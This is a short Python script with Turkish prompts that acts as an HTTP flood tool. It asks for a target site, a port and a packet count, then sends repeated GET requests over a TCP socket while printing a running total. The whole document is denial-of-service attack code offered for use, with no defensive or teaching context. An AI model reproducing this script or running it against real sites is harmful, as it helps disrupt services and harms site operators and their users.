import subprocess
import socket 



subprocess.call('clear', shell=True)
target = str(input("Lutfen flood gerceklestirilicek site:"))
targetp = int(input("Lutfen port giriniz:"))

packet = int(input("Kac paket gonderilsin:"))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,targetp))

request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % target

sayac = 0

while sayac < packet:
	s.send(request.encode())
	sayac = sayac+1
	print("gonderilen paket sayisi "+ str(sayac))
